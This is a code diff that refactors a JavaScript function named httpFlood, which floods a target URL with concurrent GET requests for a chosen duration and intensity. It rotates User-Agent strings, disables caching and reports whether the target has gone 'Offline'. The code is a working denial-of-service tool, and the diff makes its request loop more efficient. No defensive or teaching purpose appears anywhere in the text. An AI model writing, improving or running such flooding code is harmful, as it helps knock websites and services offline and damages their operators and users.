@@ -3,6 +3,7 @@ async function httpFlood(target, duration, intensity) {
   let targetStatus = 'Online';
   let mbps = 0;
   const startTime = Date.now();
+  let endTime = startTime + duration * 1000;
 
   try {
     const url = new URL(target);
@@ -27,43 +28,46 @@ async function httpFlood(target, duration, intensity) {
       'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
     ];
 
-    while (Date.now() - startTime < duration * 1000) {
+    async function sendRequest() {
+      if (Date.now() >= endTime) {
+        return;
+      }
+      const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
+      const requestOptions = {
+        method: 'GET',
+        headers: {
+          'User-Agent': userAgent,
+          'X-Noodles-Bot': 'Active',
+          'Cache-Control': 'no-cache',
+          'Connection': 'keep-alive'
+        },
+        mode: 'cors'
+      };
+
+      try {
+        const response = await fetch(target, requestOptions);
+        if (response.ok) {
+          packetsSent++;
+          const contentLength = response.headers.get('content-length');
+          if (contentLength) {
+            mbps += parseInt(contentLength, 10) / 1000000;
+          } else {
+            mbps += 0.1;
+          }
+          targetStatus = 'Online';
+        } else {
+          targetStatus = 'Unresponsive';
+        }
+        await response.text();
+      } catch (error) {
+        targetStatus = 'Offline';
+      }
+    }
+
+    while (Date.now() < endTime) {
       const promises = [];
       for (let i = 0; i < intensity; i++) {
-        const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
-        const requestOptions = {
-          method: 'GET',
-          headers: {
-            'User-Agent': userAgent,
-            'X-Noodles-Bot': 'Active',
-            'Cache-Control': 'no-cache',
-            'Connection': 'keep-alive'
-          },
-          mode: 'cors'
-        };
-
-        const promise = fetch(target, requestOptions)
-          .then(response => {
-            if (response.ok) {
-              packetsSent++;
-              const contentLength = response.headers.get('content-length');
-              if (contentLength) {
-                mbps += parseInt(contentLength, 10) / 1000000;
-              } else {
-                mbps += 0.1;
-              }
-              targetStatus = 'Online';
-            } else {
-              targetStatus = 'Unresponsive';
-            }
-            return response.text();
-          })
-          .then(() => {
-          })
-          .catch(error => {
-            targetStatus = 'Offline';
-          });
-        promises.push(promise);
+        promises.push(sendRequest());
       }
       await Promise.all(promises);
       await new Promise(resolve => setTimeout(resolve, interval));
